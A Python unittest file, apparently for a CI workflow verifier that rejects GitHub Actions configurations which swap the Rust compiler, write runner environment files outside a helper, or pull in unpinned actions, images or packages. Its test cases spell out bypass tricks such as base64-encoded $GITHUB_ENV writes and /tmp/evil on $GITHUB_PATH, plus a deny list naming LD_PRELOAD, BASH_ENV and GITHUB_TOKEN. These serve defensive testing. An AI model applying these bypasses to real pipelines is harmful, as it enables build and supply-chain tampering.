            "      env:\n        K: cargo_build_rustc_wrapper\n"
            "      run: echo \"$K=sccache\" >> \"$GITHUB_ENV\"\n",
        )
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.assertRefused("./.github/actions/w/action.yml: step 'B' env.K")

    def test_rustc_replacing_env_keys_are_refused(self) -> None:
        for key in ("RUSTC", "CARGO_BUILD_RUSTC", "rustc", "Cargo_Build_Rustc"):
            with self.subTest(key=key):
                self.ci(f"env:\n  {key}: /tmp/fake-rustc\nsteps:\n  - run: cargo build\n")
                self.assertRefused("job 'clippy' env sets", repr(key.casefold()))

    def test_rustc_replacing_text_is_refused(self) -> None:
        for run in (
            "RUSTC=/tmp/r cargo build",
            "export CARGO_BUILD_RUSTC=/tmp/r",
            "echo \"RUSTC=/tmp/r\" >> \"$GITHUB_ENV\"",
            "cargo --config build.rustc='\"/tmp/r\"' build",
            "printf '[build]\\nrustc = \"/tmp/r\"\\n' >> ~/.cargo/config.toml",
        ):
            with self.subTest(run=run):
                self.ci(f"steps:\n  - name: Build\n    run: {run}\n")
                self.assertRefused("step 'Build' run:")
        self.ci("steps:\n  - uses: some/action@0123456789abcdef0123456789abcdef01234567\n    with:\n      rustc: /tmp/r\n")
        self.assertRefused("with.rustc")

    def test_benign_rustc_mentions_pass(self) -> None:
        self.ci("env:\n  RUSTFLAGS: -Dwarnings\nsteps:\n  - run: rustc --version && cargo build\n")
        self.assertEqual(self.fx.errors(), [])

    # ---- strict positive proof of the sanctioned composite (F2) ----------

    def _sanctioned(self, steps: str) -> None:
        _write(
            os.path.join(self.fx.root, "actions", "sccache", "action.yml"),
            "runs:\n  using: composite\n  steps:\n" + textwrap.indent(textwrap.dedent(steps), "    "),
        )
        self.ci("steps:\n  - run: cargo build\n")

    def test_composite_writing_only_one_var_is_refused(self) -> None:
        self._sanctioned(
            "- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n"
            "- shell: bash\n  run: echo SCCACHE_GHA_ENABLED=true >> $GITHUB_ENV\n"
        )
        self.assertRefused("step 2 is not the canonical wiring step")

    def test_composite_loose_write_is_not_proof(self) -> None:
        self._sanctioned(
            "- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n"
            "- shell: bash\n  run: |\n"
            "    # RUSTC_WRAPPER=sccache SCCACHE_GHA_ENABLED=true $GITHUB_ENV\n"
            "    printf '%s=%s\\n' RUSTC_WRAPPER sccache >> \"$GITHUB_ENV\"\n"
        )
        self.assertRefused("step 2 is not the canonical wiring step")

    def test_composite_conditional_wiring_is_not_proof(self) -> None:
        self._sanctioned(
            "- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n"
            "- shell: bash\n  if: false\n  run: |\n"
            "    echo \"RUSTC_WRAPPER=sccache\" >> \"$GITHUB_ENV\"\n"
            "    echo \"SCCACHE_GHA_ENABLED=true\" >> \"$GITHUB_ENV\"\n"
        )
        self.assertRefused("step 2 is not the canonical wiring step")

    def test_composite_conditional_install_is_not_proof(self) -> None:
        self._sanctioned(
            "- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n  if: false\n"
            "- shell: bash\n  run: |\n"
            "    echo \"RUSTC_WRAPPER=sccache\" >> \"$GITHUB_ENV\"\n"
            "    echo \"SCCACHE_GHA_ENABLED=true\" >> \"$GITHUB_ENV\"\n"
        )
        self.assertRefused("step 1 must be exactly")

    _WIRE = (
        "- name: Wire rustc through sccache\n  shell: bash\n  run: |\n"
        + textwrap.indent(verify_manifest.SCCACHE_WIRE_RUN, "    ")
    )

    def test_canonical_composite_with_other_install_ref_passes(self) -> None:
        self._sanctioned("- uses: mozilla-actions/sccache-action@0123456789abcdef0123456789abcdef01234567\n" + self._WIRE)
        self.assertEqual(self.fx.errors(), [])

    def test_composite_wiring_under_dead_branch_is_refused(self) -> None:
        self._sanctioned(
            "- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n"
            "- name: Wire rustc through sccache\n  shell: bash\n  run: |\n"
            "    if false; then\n"
            + textwrap.indent(verify_manifest.SCCACHE_WIRE_RUN, "    ")
            + "    fi\n"
        )
        self.assertRefused("step 2 is not the canonical wiring step")

    def test_composite_later_step_unwiring_is_refused(self) -> None:
        self._sanctioned(
            "- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n"
            + self._WIRE
            + "- shell: bash\n  run: echo \"RUSTC_WRAPPER=\" >> \"$GITHUB_ENV\"\n"
        )
        self.assertRefused("exactly two steps")

    def test_composite_nested_local_uses_is_refused(self) -> None:
        self.repo_action(
            "tools/act",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo \"RUSTC_WRAPPER=\" >> \"$GITHUB_ENV\"\n",
        )
        self._sanctioned("- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n" + self._WIRE + "- uses: ./tools/act\n")
        self.assertRefused("exactly two steps")
        self._sanctioned("- uses: ./tools/act\n" + self._WIRE)
        self.assertRefused("step 1 must be exactly")

    def test_composite_install_step_with_extra_keys_is_refused(self) -> None:
        for extra in ("  with:\n    version: v0.8.0\n", "  continue-on-error: true\n", "  name: x\n"):
            with self.subTest(extra=extra):
                self._sanctioned("- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n" + extra + self._WIRE)
                self.assertRefused("step 1 must be exactly")

    def test_composite_reordered_or_env_bearing_wire_is_refused(self) -> None:
        self._sanctioned(self._WIRE + "- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n")
        self.assertRefused("step 1 must be exactly")
        self._sanctioned(
            "- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n" + self._WIRE + "  env:\n    RUSTC_WRAPPER: ''\n"
        )
        self.assertRefused("step 2 is not the canonical wiring step")

    def test_composite_extra_document_or_runs_keys_are_refused(self) -> None:
        body = "  steps:\n" + textwrap.indent("- uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n" + self._WIRE, "    ")
        path = os.path.join(self.fx.root, "actions", "sccache", "action.yml")
        self.ci("steps:\n  - run: cargo build\n")
        _write(path, "inputs:\n  x:\n    default: y\nruns:\n  using: composite\n" + body)
        self.assertRefused("keys ['inputs'] are outside the canonical composite")
        _write(path, "runs:\n  using: composite\n  post: x\n" + body)
        self.assertRefused("`runs:` keys must be exactly")

    # ---- deterministic-checks SSOT (F4) -----------------------------------

    def test_missing_deterministic_checks_file_is_refused(self) -> None:
        os.remove(os.path.join(self.fx.root, "ci", "deterministic-checks.json"))
        self.ci("steps:\n  - uses: ./.github/actions/sccache\n  - name: Run clippy\n    run: cargo clippy\n")
        self.assertRefused("cannot establish the deterministic check steps")

    def test_malformed_deterministic_checks_file_is_refused(self) -> None:
        _write(os.path.join(self.fx.root, "ci", "deterministic-checks.json"), '{"checks": "x"}')
        self.ci("steps:\n  - run: cargo build\n")
        self.assertRefused("cannot establish the deterministic check steps")

    # ---- malformed shapes (F5) --------------------------------------------

    def test_malformed_shapes_are_refused(self) -> None:
        cases = {
            "doc": ("- a\n- b\n", "the workflow document is not a mapping"),
            "jobs": ("name: ci\non: push\njobs: [1]\n", "jobs: is not a non-empty mapping"),
            "job": ("name: ci\non: push\njobs:\n  clippy: 3\n", "the job is not a mapping"),
            "steps": (_ci("steps: oops\n"), "steps: is not a list"),
            "step": (_ci("steps:\n  - just-a-string\n"), "steps[0] is not a mapping"),
            "services": (_ci("services: [pg]\nsteps: []\n"), "services: is not a mapping"),
            "container": (_ci("container: [rust]\nsteps: []\n"), "container: is not"),
            "defaults": (_ci("defaults: x\nsteps: []\n"), "defaults: is not a mapping"),
            "run": (_ci("steps:\n  - run: [a]\n"), "run: is not a string"),
        }
        for what, (doc, needle) in cases.items():
            with self.subTest(what=what):
                self.fx.workflow("ci.yml", doc)
                self.assertRefused(needle)

    def test_malformed_composite_steps_are_refused(self) -> None:
        self.fx.composite("w", "runs:\n  using: composite\n  steps: nope\n")
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.assertRefused("steps: is not a list")

    # ---- expression-assembly in run:/env: (strict_yaml.refuse_expression_assembly) --

    def test_format_assembly_in_run_is_refused(self) -> None:
        self.ci(
            "steps:\n  - name: Build\n"
            "    run: echo \"${{ format('RUSTC_{0}', 'WRAPPER') }}=sccache\" >> \"$GITHUB_ENV\"\n"
        )
        self.assertRefused("step 'Build' run:", "expression-assembly")

    def test_join_assembly_in_env_is_refused(self) -> None:
        self.ci(
            "steps:\n  - name: Build\n    env:\n"
            "      X: \"${{ join(github.event.inputs.*, '_') }}\"\n"
            "    run: cargo build\n"
        )
        self.assertRefused("step 'Build' env.X", "expression-assembly")

    def test_tojson_assembly_in_run_is_refused(self) -> None:
        self.ci(
            "steps:\n  - name: Build\n"
            "    run: echo '${{ toJSON(github.event) }}' >> \"$GITHUB_ENV\"\n"
        )
        self.assertRefused("step 'Build' run:", "expression-assembly")

    # ---- YAML structural ambiguities feed the workflow loader closed
    # (strict_yaml.StrictSafeLoader), not just check_workflow_steps' text scan --

    def test_duplicate_key_workflow_is_refused_not_silently_resolved(self) -> None:
        self.fx.workflow(
            "ci.yml",
            "name: ci\non: push\njobs:\n  clippy:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: cargo build\n"
            "    steps:\n      - run: RUSTC_WRAPPER=evil cargo build\n",
        )
        self.assertRefused("ci.yml is not valid YAML", "duplicate key")

    def test_merge_key_workflow_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            "base: &base\n  runs-on: ubuntu-latest\n"
            "name: ci\non: push\njobs:\n  clippy:\n"
            "    <<: *base\n    steps:\n      - run: cargo build\n",
        )
        self.assertRefused("ci.yml is not valid YAML")

    def test_anchor_alias_workflow_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            "name: ci\non: push\njobs:\n  clippy: &clippy\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: cargo build\n  clippy2: *clippy\n",
        )
        self.assertRefused("ci.yml is not valid YAML")


_HELPER_CALL = 'bash "$GITHUB_WORKSPACE/.github/ci/github-env.sh"'
_REQS = '"$GITHUB_WORKSPACE/.github/ci/requirements.txt"'
_PINNED_SHA = "0123456789abcdef0123456789abcdef01234567"
_DIGEST = "sha256:" + "ab" * 32


class TestPinnedInputsAndEnvFileWrites(unittest.TestCase):
    """Check 7: CI inputs pinned by content, env-file writes only through the helper."""

    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmpdir.cleanup)
        self.fx = SccacheFixture(self._tmpdir.name)

    def assertRefused(self, *needles: str) -> list[str]:
        errors = self.fx.errors()
        self.assertTrue(any(all(n in e for n in needles) for e in errors), errors)
        return errors

    def ci(self, job_body: str, **kw: str) -> None:
        self.fx.workflow("ci.yml", _ci(job_body, **kw))

    def allowlist(self, content: str) -> None:
        _write(os.path.join(self.fx.root, "ci", "github-env-allowlist.txt"), content)

    # ---- env-file writes: every bypass of a name-matching scan ----------

    def test_env_file_write_bypasses_are_refused(self) -> None:
        cases = {
            "adjacent-quote concat": 'echo "RUSTC_""WRAPPER=x" >> "$GITHUB_ENV"',
            "variable indirection": 'W=RUSTC_WRAPPER; echo "$W=x" >> "$GITHUB_ENV"',
            "base64 payload": "echo UlVTVENfV1JBUFBFUj14 | base64 -d >> $GITHUB_ENV",
            "path file": 'echo /tmp/evil >> "$GITHUB_PATH"',
            "lower-case name": 'echo "A=b" >> "$github_env"',
            "braced name": 'echo "A=b" >> "${GITHUB_ENV}"',
            "runner command file": "echo A=b >> /home/runner/work/_temp/_runner_file_commands/set_env_1",
            "legacy set-env": 'echo "::set-env name=A::b"',
            "legacy add-path": 'echo "::add-path::/tmp/evil"',
        }
        for name, run in cases.items():
            with self.subTest(name):
                self.ci(f"steps:\n  - name: W\n    run: {run!r}\n")
                self.assertRefused("step 'W' run:", "written only through")

    def test_env_file_benign_allowlisted_key_value_is_still_refused_raw(self) -> None:
        self.ci("steps:\n  - name: W\n    run: echo \"CI_JOB_BIN_NAME=ipe\" >> \"$GITHUB_ENV\"\n")
        self.assertRefused("step 'W' run:", "'GITHUB_ENV'")

    def test_legacy_command_switch_in_env_is_refused(self) -> None:
        self.ci("env:\n  ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\nsteps:\n  - run: cargo build\n")
        self.assertRefused("env.ACTIONS_ALLOW_UNSECURE_COMMANDS", "written only through")

    def test_env_file_name_in_with_and_shell_is_refused(self) -> None:
        self.ci(f"steps:\n  - uses: some/action@{_PINNED_SHA}\n    with:\n      target: $GITHUB_ENV\n")
        self.assertRefused("with.target", "written only through")
        self.ci("steps:\n  - name: S\n    shell: bash --rcfile $GITHUB_ENV {0}\n    run: x\n")
        self.assertRefused("step 'S' shell:", "written only through")

    def test_env_file_write_inside_local_composite_is_refused(self) -> None:
        self.fx.composite(
            "w", "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo A=b >> $GITHUB_ENV\n"
        )
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.assertRefused("./.github/actions/w/action.yml", "written only through")

    # ---- runner command files: every spelling, every string scalar -------

    def test_runner_file_spellings_are_refused(self) -> None:
        cases = {
            "github.env expression": "echo x >> ${{ github.env }}",
            "github.path expression": "echo /tmp >> ${{ github.path }}",
            "upper-case context": "echo x >> ${{ GITHUB.ENV }}",
            "spaced access": "echo x >> ${{ github . env }}",
            "bracket index": "echo x >> ${{ github['env'] }}",
            "assembled index": "echo x >> ${{ github[format('{0}', 'env')] }}",
            "whole context": "echo '${{ toJSON(github) }}'",
            "filter": "echo '${{ github.* }}'",
            "whole env context": "echo '${{ toJSON(env) }}'",
            "env context name": "echo x >> ${{ env.GITHUB_ENV }}",
            "state file": 'echo a=b >> "$GITHUB_STATE"',
            "state property": "echo a=b >> ${{ github.state }}",
            "output property": "echo a=b >> ${{ github.output }}",
            "summary property": "echo a=b >> ${{ github.step_summary }}",
            "output rewritten": 'echo a=b >> "${GITHUB_OUTPUT/OUTPUT/ENV}"',
            "output reassigned": 'GITHUB_OUTPUT=$GITHUB_ENV; echo a=b >> "$GITHUB_OUTPUT"',
            "output overwritten": 'echo a=b > "$GITHUB_OUTPUT"',
            "output suffix": 'echo a=b >> "$GITHUB_OUTPUTX"',
            "lower-case output": 'echo a=b >> "$github_output"',
            "pwsh output other param": "Set-Content -Path $env:GITHUB_OUTPUT a=b",
            "legacy save-state": 'echo "::save-state name=a::b"',
            "legacy set-output": 'echo "::set-output name=a::b"',
            "state command file": "echo a >> /x/_temp/_runner_file_commands/save_state_1",
        }
        for name, run in cases.items():
            with self.subTest(name):
                self.ci(f"steps:\n  - name: W\n    run: {run!r}\n")
                self.assertRefused("step 'W' run:", "written only")

    def test_runner_file_spelling_in_if_is_refused(self) -> None:
        for cond in ("github.env != ''", "${{ github.path }}", "GITHUB['ENV']", "toJSON(github)"):
            with self.subTest(cond=cond):
                self.ci(f"steps:\n  - name: W\n    if: {cond!r}\n    run: x\n")
                self.assertRefused("step 'W' if:", "written only")

    def test_runner_file_spelling_in_any_string_scalar_is_refused(self) -> None:
        for name, body, needle in (
            ("step name", "steps:\n  - name: '${{ github.env }}'\n    run: x\n", "name:"),
            ("nested with", f"steps:\n  - uses: a/b@{_PINNED_SHA}\n    with:\n      c: ${{{{ github.path }}}}\n",
             "with.c"),
            ("with key", f"steps:\n  - uses: a/b@{_PINNED_SHA}\n    with:\n      GITHUB_ENV: x\n", "with.GITHUB_ENV"),
            ("step env key", "steps:\n  - env:\n      GITHUB_OUTPUT: /x\n    run: x\n", "env.GITHUB_OUTPUT"),
            ("step env value", "steps:\n  - env:\n      A: ${{ github.env }}\n    run: x\n", "env.A"),
            ("job matrix", "strategy:\n  matrix:\n    f: ['${{ github.env }}']\nsteps:\n  - run: x\n",
             "strategy.matrix.f[0]"),
            ("job env key", "env:\n  GITHUB_PATH: /x\nsteps:\n  - run: x\n", "env.GITHUB_PATH"),
            ("job if", "if: github.env\nsteps:\n  - run: x\n", "if:"),
        ):
            with self.subTest(name):
                self.ci(body)
                self.assertRefused(needle, "written only")

    def test_runner_file_spelling_at_workflow_level_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            "name: ci\non:\n  workflow_dispatch:\n    inputs:\n      t:\n        default: '${{ github.env }}'\n"
            "jobs:\n  clippy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: x\n",
        )
        self.assertRefused("ci.yml: workflow-level", "written only")
        self.ci("steps:\n  - run: x\n", top="env:\n  GITHUB_ENV: /x\n")
        self.assertRefused("ci.yml: workflow-level", "env.GITHUB_ENV", "written only")

    def test_runner_file_spelling_in_local_action_metadata_is_refused(self) -> None:
        self.fx.composite(
            "w",
            "inputs:\n  t:\n    default: '${{ github.env }}'\n"
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo ok\n",
        )
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.assertRefused("./.github/actions/w/action.yml", "inputs.t.default", "written only")

    def test_helper_call_outside_a_step_run_is_refused(self) -> None:
        call = f"{_HELPER_CALL} CI_JOB_BIN_NAME x"
        for name, body in (
            ("with", f"steps:\n  - uses: a/b@{_PINNED_SHA}\n    with:\n      c: {call!r}\n"),
            ("step env", f"steps:\n  - env:\n      A: {call!r}\n    run: x\n"),
            ("job env", f"env:\n  A: {call!r}\nsteps:\n  - run: x\n"),
            ("step name", f"steps:\n  - name: {call!r}\n    run: x\n"),
        ):
            with self.subTest(name):
                self.ci(body)
                self.assertRefused("outside its one canonical call")

    def test_sanctioned_runner_file_and_context_uses_pass(self) -> None:
        self.ci(
            "steps:\n"
            "  - name: A\n    run: echo \"a=b\" >> \"$GITHUB_OUTPUT\"\n"
            "  - name: B\n    run: echo x >> \"${GITHUB_STEP_SUMMARY}\"\n"
            "  - name: C\n    run: echo x >> $GITHUB_STEP_SUMMARY\n"
            "  - name: D\n    shell: pwsh\n    run: '\"a=b\" | Out-File -FilePath $env:GITHUB_OUTPUT -Append'\n"
            "  - name: E\n    run: cd \"${{ github.workspace }}\" && echo \"${{ env.CI_JOB_BIN_NAME }}\"\n"
            "  - name: F\n    if: github.actor != 'github-actions' && github.event_name != 'env'\n    run: x\n"
            "  - name: G\n    run: ls \"$GITHUB_WORKSPACE\" \"${GITHUB_WORKSPACE}/x\"\n"
        )
        self.assertEqual(self.fx.errors(), [])

    def test_github_workspace_write_is_refused(self) -> None:
        for name, body in (
            ("assignment", "steps:\n  - name: W\n    run: GITHUB_WORKSPACE=/x\n"),
            ("reference assignment", "steps:\n  - name: W\n    run: '$GITHUB_WORKSPACE=/x'\n"),
            ("export", "steps:\n  - name: W\n    run: export GITHUB_WORKSPACE\n"),
            ("default expansion", "steps:\n  - name: W\n    run: 'echo ${GITHUB_WORKSPACE:=/x}'\n"),
            ("lower case", "steps:\n  - name: W\n    run: github_workspace=/x\n"),
            ("pwsh", "steps:\n  - name: W\n    shell: pwsh\n    run: \"$env:GITHUB_WORKSPACE = 'x'\"\n"),
            ("step env key", "steps:\n  - name: W\n    env:\n      GITHUB_WORKSPACE: /x\n    run: x\n"),
            ("job env key", "env:\n  GITHUB_WORKSPACE: /x\nsteps:\n  - name: W\n    run: x\n"),
        ):
            with self.subTest(name):
                self.ci(body)
                self.assertRefused("other than as a plain read")

    def test_string_scalar_nesting_past_the_limit_is_refused(self) -> None:
        errors: list[str] = []
        deep: object = "x"
        for _ in range(verify_manifest.STRING_SCALAR_DEPTH_LIMIT + 1):
            deep = [deep]
        verify_manifest._string_scalars({"k": deep}, "loc", errors)
        self.assertTrue(any("nests deeper than" in e for e in errors), errors)
        errors.clear()
        shallow: object = "x"
        for _ in range(verify_manifest.STRING_SCALAR_DEPTH_LIMIT - 2):
            shallow = [shallow]
        self.assertIn(("k" + "[0]" * (verify_manifest.STRING_SCALAR_DEPTH_LIMIT - 2), "x", False),
                      verify_manifest._string_scalars({"k": shallow}, "loc", errors))
        self.assertEqual(errors, [])

    # ---- the helper: one canonical call, bare allowlisted key ------------

    def test_canonical_helper_call_with_allowlisted_key_passes(self) -> None:
        self.ci(f"steps:\n  - name: W\n    run: 'X=ipe; {_HELPER_CALL} CI_JOB_BIN_NAME \"$X\"'\n")
        self.assertEqual(self.fx.errors(), [])

    def test_helper_call_with_non_allowlisted_key_is_refused(self) -> None:
        self.ci(f"steps:\n  - name: W\n    run: '{_HELPER_CALL} OTHER_KEY x'\n")
        self.assertRefused("step 'W' run:", "'OTHER_KEY'", "not in ci/github-env-allowlist.txt")

    def test_helper_call_outside_canonical_form_is_refused(self) -> None:
        for name, run in {
            "variable key": f'W=CI_JOB_BIN_NAME; {_HELPER_CALL} "$W" x',
            "quoted key": f'{_HELPER_CALL} "CI_JOB_BIN_NAME" x',
            "concatenated key": f"{_HELPER_CALL} CI_JOB_BIN_\"\"NAME x",
            "relative path": "bash .github/ci/github-env.sh CI_JOB_BIN_NAME x",
            "sourced": 'source "$GITHUB_WORKSPACE/.github/ci/github-env.sh" CI_JOB_BIN_NAME x',
            "other interpreter": 'sh "$GITHUB_WORKSPACE/.github/ci/github-env.sh" CI_JOB_BIN_NAME x',
            "copied helper": 'cp .github/ci/github-env.sh /tmp/w.sh',
            "no value": f"{_HELPER_CALL} CI_JOB_BIN_NAME ",
        }.items():
            with self.subTest(name):
                self.ci(f"steps:\n  - name: W\n    run: {run!r}\n")
                self.assertRefused("step 'W' run:", "outside its one canonical call")

    # ---- the allowlist itself --------------------------------------------

    def test_allowlist_refuses_dangerous_keys(self) -> None:
        for key in ("PATH", "RUSTC_WRAPPER", "SCCACHE_DIR", "LD_PRELOAD", "BASH_ENV", "NODE_OPTIONS",
                    "GITHUB_TOKEN", "RUNNER_TEMP", "CARGO_HOME", "lower_case", "A-B"):
            with self.subTest(key=key):
                self.allowlist(f"# header\nCI_JOB_BIN_NAME\n{key}\n")
                self.ci("steps:\n  - run: cargo build\n")
                self.assertRefused("github-env-allowlist.txt:3:", repr(key))

    def test_allowlist_refuses_keys_outside_the_job_shape(self) -> None:
        for key in ("BIN_NAME", "CI_JOB_", "CI_JOB_lower", "ci_job_x", "CI_JOBX", "X_CI_JOB_Y", "CI_JOB_A-B"):
            with self.subTest(key=key):
                self.allowlist(f"CI_JOB_BIN_NAME\n{key}\n")
                self.ci("steps:\n  - run: cargo build\n")
                self.assertRefused("github-env-allowlist.txt:2:", repr(key))

    def test_allowlist_duplicate_key_is_refused(self) -> None:
        self.allowlist("CI_JOB_BIN_NAME\nCI_JOB_BIN_NAME\n")
        self.ci("steps:\n  - run: cargo build\n")
        self.assertRefused("github-env-allowlist.txt:2:", "listed twice")

    def test_missing_allowlist_fails_closed(self) -> None:
        os.remove(os.path.join(self.fx.root, "ci", "github-env-allowlist.txt"))
        self.ci(f"steps:\n  - name: W\n    run: '{_HELPER_CALL} CI_JOB_BIN_NAME x'\n")
        errors = self.assertRefused("github-env-allowlist.txt", "cannot be read")
        self.assertTrue(any("'CI_JOB_BIN_NAME'" in e and "not in" in e for e in errors), errors)

    # ---- `uses:` pinned by content ---------------------------------------

    def test_unpinned_uses_forms_are_refused(self) -> None:
        for uses in (
            "actions/checkout@v7",
            "actions/checkout@main",
            "actions/checkout@3d3c42e",
            "actions/checkout@3D3C42E5AAC5BA805825DA76410C181273BA90B1",
            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1x",
            "actions/checkout",
            "github/codeql-action/init@v3",
            "docker://alpine:3.20",
            "docker://alpine",
        ):
            with self.subTest(uses=uses):
                self.ci(f"steps:\n  - uses: {uses}\n")
                self.assertRefused(repr(uses), "not pinned by content")

    def test_pinned_uses_forms_pass(self) -> None:
        self.ci(
            f"steps:\n  - uses: actions/checkout@{_PINNED_SHA} # v7\n"
            f"  - uses: github/codeql-action/init@{_PINNED_SHA}\n"
            f"  - uses: docker://alpine@{_DIGEST}\n"
        )
        self.assertEqual(self.fx.errors(), [])

    def test_non_string_uses_is_refused(self) -> None:
        self.ci("steps:\n  - uses: [actions/checkout]\n")
        self.assertRefused("uses:", "a string")

    def test_unpinned_uses_inside_local_composite_is_refused(self) -> None:
        self.fx.composite("w", "runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n")
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.assertRefused("./.github/actions/w/action.yml", "not pinned by content")

    def test_sanctioned_composite_tag_pinned_install_is_refused(self) -> None:
        _write(
            os.path.join(self.fx.root, "actions", "sccache", "action.yml"),
            VALID_COMPOSITE.replace(
                "sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad", "sccache-action@v0.0.9"
            ),
        )
        self.ci("steps:\n  - run: cargo build\n")
        self.assertRefused("step 1 must be exactly")

    def test_unpinned_job_images_are_refused(self) -> None:
        for body, needle in (
            ("container: rust:1\n", "job 'clippy' container image 'rust:1'"),
            ("container:\n  image: rust:1\n", "job 'clippy' container image 'rust:1'"),
            ("services:\n  db:\n    image: postgres:16\n", "service 'db' image 'postgres:16'"),
        ):
            with self.subTest(body=body):
                self.ci(body + "steps:\n  - run: cargo build\n")
                self.assertRefused(needle, "not pinned by sha256 digest")

    def test_digest_pinned_job_images_pass(self) -> None:
        self.ci(
            f"container:\n  image: rust@{_DIGEST}\n"
            f"services:\n  db:\n    image: postgres@{_DIGEST}\n"
            "steps:\n  - run: cargo build\n"
        )
        self.assertEqual(self.fx.errors(), [])

    # ---- pip: only the hash-checked shape --------------------------------

    def test_unhashed_pip_installs_are_refused(self) -> None:
        for run in (
            "pip install pyyaml",
            "python3 -m pip install --quiet pyyaml==6.0.3",
            "pip install -r .github/ci/requirements.txt",
            "pip install --require-hashes -r .github/ci/requirements.txt",
            "pip install --require-hashes --only-binary :all: -r r.txt pyyaml",
            "pip install --require-hashes --only-binary :all: --index-url https://x -r r.txt",
            "pip install --require-hashes --only-binary :all: -r r.txt --no-deps -e .",
            "PIP3 install pyyaml",
            "/usr/bin/pip3.12 install pyyaml",
            "cd x && pip install pyyaml",
            "pip3 --quiet install pyyaml",
            "pipx install pyyaml",
            "easy_install pyyaml",
        ):
            with self.subTest(run=run):
                self.ci(f"steps:\n  - name: P\n    run: {run!r}\n")
                self.assertRefused("step 'P' run:")

    def test_pip_install_across_line_continuation_is_refused(self) -> None:
        self.ci("steps:\n  - name: P\n    run: |\n      pip \\\n        install pyyaml\n")
        self.assertRefused("step 'P' run:", "outside the hash-checked shape")

    def test_pip_install_outside_the_one_requirements_file_is_refused(self) -> None:
        base = "pip install --require-hashes --only-binary :all:"
        for name, (run, needle) in {
            "same file twice": (f"{base} -r {_REQS} -r {_REQS}", "2 times, not exactly once"),
            "second file": (f"{base} -r {_REQS} -r other.txt", "'other.txt' is not"),
            "other file": (f"{base} -r r.txt", "'r.txt' is not"),
            "relative canonical file": (f"{base} -r .github/ci/requirements.txt", "is not"),
            "bare package": (f"{base} -r {_REQS} pyyaml", "'pyyaml' is outside"),
            "editable": (f"{base} -r {_REQS} -e .", "'-e' is outside"),
            "url": (f"{base} -r {_REQS} https://x/p.whl", "'https://x/p.whl' is outside"),
            "url requirements": (f"{base} -r https://x/r.txt", "'https://x/r.txt' is not"),
            "no requirements": (base, "lacks"),
        }.items():
            with self.subTest(name):
                self.ci(f"steps:\n  - name: P\n    run: {run!r}\n")
                self.assertRefused("step 'P' run:", needle)

    def test_every_pip_spelling_is_seen(self) -> None:
        for run in (
            "python3 -m pip install pyyaml",
            "python3 -mpip install pyyaml",
            f"python3 -mpip install --require-hashes --only-binary :all: -r {_REQS}",
            "python3 -m  pip install pyyaml",
            "pip3.12 install pyyaml",
            "pipx run pyyaml",
            "easy_install pyyaml",
            "EASY_INSTALL pyyaml",
        ):
            with self.subTest(run=run):
                self.ci(f"steps:\n  - name: P\n    run: {run!r}\n")
                self.assertRefused("step 'P' run:")

    def test_canonical_hashed_pip_install_passes(self) -> None:
        for run in (
            f"PIP_CONFIG_FILE=/dev/null python3 -m pip install --isolated --require-hashes --only-binary :all: -r {_REQS}",
            "pip --version",
        ):
            with self.subTest(run=run):
                self.ci(f"steps:\n  - name: P\n    run: {run!r}\n")
                self.assertEqual(self.fx.errors(), [])

    def test_hash_checked_install_outside_the_canonical_form_is_refused(self) -> None:
        for run, needle in (
            (f"python3 -m pip install --quiet --require-hashes --only-binary :all: -r {_REQS}", "'--quiet'"),
            (f"pip install --only-binary=:all: --require-hashes --requirement {_REQS}", "pip runs as"),
            (f"python3 -m pip install --isolated --require-hashes --only-binary :all: -r {_REQS}", "environment prefix"),
            (f"PIP_CONFIG_FILE=/dev/null python -m pip install --isolated --require-hashes --only-binary :all: -r {_REQS}", "pip runs as"),
            (f"PIP_CONFIG_FILE=/dev/null python3 -m pip install --require-hashes --only-binary :all: -r {_REQS}", "not exactly"),
            (f"PIP_CONFIG_FILE=/dev/null python3 -m pip install --isolated --only-binary :all: --require-hashes -r {_REQS}", "not exactly"),
        ):
            with self.subTest(run=run):
                self.ci(f"steps:\n  - name: P\n    run: {run!r}\n")
                self.assertRefused("step 'P' run:", needle)


def _block(run: str) -> str:
    """A one-step job whose `run:` is `run` as a YAML literal block."""
    body = "".join(f"      {line}\n" for line in run.split("\n"))
    return f"steps:\n  - name: P\n    run: |\n{body}"


_CANONICAL_PIP = (
    "PIP_CONFIG_FILE=/dev/null python3 -m pip install --isolated --require-hashes "
    f"--only-binary :all: -r {_REQS}"
)


class TestTypedExpressionAndShellReads(unittest.TestCase):
    """Expression bodies are parsed, never regex-scanned; pip is one canonical
    command; shell words are judged after quote removal."""

    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
